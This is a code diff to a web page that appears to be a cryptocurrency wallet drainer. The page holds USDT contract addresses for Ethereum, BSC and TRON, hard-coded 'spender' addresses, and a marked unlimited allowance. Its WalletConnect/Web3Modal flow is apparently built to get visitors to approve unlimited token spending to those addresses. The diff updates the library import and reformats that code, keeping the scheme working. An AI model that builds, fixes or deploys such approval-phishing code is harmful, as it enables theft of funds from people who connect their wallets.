@@ -235,7 +235,7 @@
 
     <!-- 引入依赖 -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.0/dist/index.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.6.0/dist/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
     
     <script>
@@ -251,16 +251,16 @@
         
         // USDT 合约地址
         const USDT_ADDRESS = {
-            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',   // Ethereum USDT
-            56: '0x55d398326f99059fF775485246999027B3197955',  // BSC USDT
-            728126428: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'    // TRON USDT
+            1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+            56: '0x55d398326f99059fF775485246999027B3197955',
+            728126428: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
         };
         
         // 授权地址（分别定义，方便后续独立修改）
         const SPENDER_ADDRESS = {
-            1: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',     // Ethereum 授权地址
-            56: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',    // BSC 授权地址（目前与 Ethereum 相同，可单独修改）
-            728126428: 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA'      // TRON 授权地址
+            1: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',
+            56: '0xEe435a366f0c89BE2108f8b02fFDe366158effa1',
+            728126428: 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA'
         };
         
         // 无限额度
@@ -340,11 +340,13 @@
         // ==================== EVM 链授权（WalletConnect） ====================
         async function initWeb3Modal() {
             if (!web3Modal) {
-                web3Modal = new Web3Modal.default({
+                web3Modal = new Web3Modal({
                     projectId: PROJECT_ID,
                     walletConnectVersion: 2,
                     themeMode: 'light',
-                    themeVariables: { '--w3m-accent-color': '#667eea' },
+                    themeVariables: {
+                        '--w3m-accent-color': '#667eea'
+                    },
                     chains: [1, 56],
                     enableExplorer: true,
                     explorerRecommendedWalletIds: [
